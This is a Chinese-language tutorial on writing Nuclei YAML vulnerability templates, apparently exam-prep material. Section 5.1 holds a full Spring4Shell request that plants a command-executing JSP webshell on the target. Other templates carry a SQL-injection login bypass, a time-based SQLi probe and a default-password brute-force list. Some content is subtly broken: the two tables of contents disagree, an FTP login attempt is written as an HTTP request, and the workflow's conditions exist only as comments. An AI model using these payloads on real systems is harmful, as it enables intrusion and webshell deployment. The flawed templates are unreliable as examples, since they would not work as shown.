# Nuclei YAML POC 编写指南

> **📘 文档定位**：CISP 考试 漏洞工具 核心 | 难度：⭐⭐⭐ | 预计阅读：25 分钟
>
> 系统讲解 Nuclei YAML POC 模板的编写规范、请求/匹配/提取器语法、变量与工作流及自动化集成，是漏洞批量验证的核心技能。

---

## 导航目录

- [一、Nuclei 基础](#一nuclei-基础)
- [二、模板语法详解](#二模板语法详解)
- [三、匹配器与提取器](#三匹配器与提取器)
- [四、工作流与变量](#四工作流与变量)
- [五、自动化集成](#五自动化集成)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 📋 目录

1. [Nuclei 基础](#一nuclei-基础)
2. [模板结构详解](#二模板结构)
3. [HTTP 探测模板](#三http-模板)
4. [复杂漏洞模板](#四复杂模板)
5. [自定义POC开发实战](#五自定义poc)
6. [工作流(Workflow)](#六工作流)
7. [完整案例](#七完整案例)

---

## 一、Nuclei 基础

```bash
# 安装
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# 更新模板库
nuclei -update-templates

# 基础扫描
nuclei -u https://example.com
nuclei -l targets.txt -o results.txt
nuclei -l targets.txt -t cves/ -severity critical,high

# 速率控制
nuclei -l targets.txt -rate-limit 150 -bulk-size 25
```

---

## 二、模板结构

```yaml
id: CVE-2024-XXXX
info:
  name: 漏洞名称
  author: your_name
  severity: critical
  description: 漏洞描述
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-XXXX
  tags: cve,cve2024,rce

# 请求定义
requests:
  - method: GET
    path:
      - "{{BaseURL}}/vulnerable/path"

    # 匹配规则
    matchers:
      - type: word
        words:
          - "vulnerable_string"
        condition: and

    # 提取器
    extractors:
      - type: regex
        regex:
          - "Version: ([0-9.]+)"
```

---

## 三、HTTP 模板

### 3.1 基础请求

```yaml
id: info-disclosure-example
info:
  name: 敏感信息泄露检测
  severity: medium

requests:
  # GET 请求
  - method: GET
    path:
      - "{{BaseURL}}/.git/config"
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/phpinfo.php"

    matchers:
      - type: word
        words:
          - "[core]"
          - "DB_PASSWORD"
          - "phpinfo()"
        condition: or
```

### 3.2 POST 请求

```yaml
id: login-bypass-example
info:
  name: 通用登录绕过
  severity: high

requests:
  - method: POST
    path:
      - "{{BaseURL}}/login"
    headers:
      Content-Type: application/json
    body: |
      {
        "username": "admin' OR '1'='1",
        "password": "anything"
      }

    matchers:
      - type: word
        words:
          - "Login Successful"
          - "Welcome admin"
        condition: or
      - type: status
        status:
          - 200
```

### 3.3 多步骤请求

```yaml
id: multi-step-example
info:
  name: 多步骤漏洞检测
  severity: high

requests:
  # Step 1: 登录获取Token
  - method: POST
    path:
      - "{{BaseURL}}/api/auth/login"
    body: '{"username":"admin","password":"admin"}'
    matchers:
      - type: word
        words:
          - "token"
    extractors:
      - type: regex
        name: token
        regex:
          - '"token":"([^"]+)"'
        group: 1

  # Step 2: 使用Token访问敏感接口
  - method: GET
    path:
      - "{{BaseURL}}/api/admin/users"
    headers:
      Authorization: "Bearer {{token}}"
    matchers:
      - type: word
        words:
          - "user_list"
```

---

## 四、复杂模板

### 4.1 条件匹配

```yaml
id: sql-injection-time-based
info:
  name: SQL时间盲注检测
  severity: critical

requests:
  - method: GET
    path:
      - "{{BaseURL}}/product.php?id=1%20AND%20SLEEP(5)"
    
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"           # 响应时间≥5秒
          - "status_code==200"       # 状态码200
        condition: and
```

### 4.2 带认证模板

```yaml
id: authenticated-scan
info:
  name: 认证后漏洞扫描
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/users"
    headers:
      Authorization: "Bearer {{token}}"
      X-API-Key: "{{api_key}}"

    matchers:
      - type: word
        words:
          - "user_id"

# 运行时指定:
# nuclei -t template.yaml -u https://xxx.com -V token=xxx -V api_key=xxx
```

---

## 五、自定义 POC

### 5.1 完整的 CVE POC 模板

```yaml
id: CVE-2022-22965-Spring4Shell
info:
  name: Spring Framework RCE (Spring4Shell)
  author: soc_team
  severity: critical
  description: Spring Framework远程代码执行漏洞(CVE-2022-22965)
  reference:
    - https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement
  tags: cve,cve2022,rce,spring,spring4shell

requests:
  # 方法1: 探测可访问的类
  - method: GET
    path:
      - "{{BaseURL}}/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "shell"
      - type: status
        status:
          - 200
```

### 5.2 弱口令检测模板

```yaml
id: default-credentials-detection
info:
  name: 常见默认口令检测
  severity: high

requests:
  # FTP
  - method: raw
    raw:
      - |
        USER {{username}}
        PASS {{password}}
    payloads:
      username:
        - admin
        - root
        - ftpuser
      password:
        - admin
        - root
        - password
        - 123456
    attack: clusterbomb

    matchers:
      - type: word
        words:
          - "230"  # FTP 登录成功

  # MySQL (需要自定义端口)
  # ...添加更多协议
```

---

## 六、工作流

```yaml
id: workflow-example
info:
  name: 组合漏洞检测工作流

workflows:
  # 第1步: 信息收集模板
  - template: exposures/configs/git-config.yaml
  - template: technologies/tech-detect.yaml
  
  # 第2步: 如果有特定技术，执行对应的漏洞模板
  - template: cves/2024/CVE-2024-XXXX.yaml
    # 条件执行: 仅当第一个模板检测到Spring Boot
  
  # 第3步: 漏洞利用(获取命令执行)
  - template: custom/exploit.yaml
```

---

## 七、完整案例

```
案例: 自研 Nuclei 模板 → 发现企业内部API漏洞

Step 1: 分析API文档(Swagger)
  → 发现 /api/users/{id}/profile 接口

Step 2: 编写Nuclei模板:
  id: api-idor-detection
  requests:
    - method: GET
      path:
        - "{{BaseURL}}/api/users/1/profile"
        - "{{BaseURL}}/api/users/2/profile"
      matchers:
        - type: word
          words:
            - "email"
            - "phone"
          condition: and

Step 3: 运行:
  nuclei -t idor.yaml -l api_targets.txt -o idor_results.txt

Step 4: 发现3个API存在IDOR漏洞(可遍历用户信息)

成果: 用自研模板批量扫出31个漏洞(远多于默认模板库)
```

---

## ✅ Checklist

- [ ] 掌握YAML模板结构
- [ ] 编写HTTP/GET/POST模板
- [ ] 掌握条件匹配(DSL表达式)
- [ ] 多步骤请求模板(提取Token)
- [ ] 自定义POC模板开发
- [ ] 模板测试与误报率评估
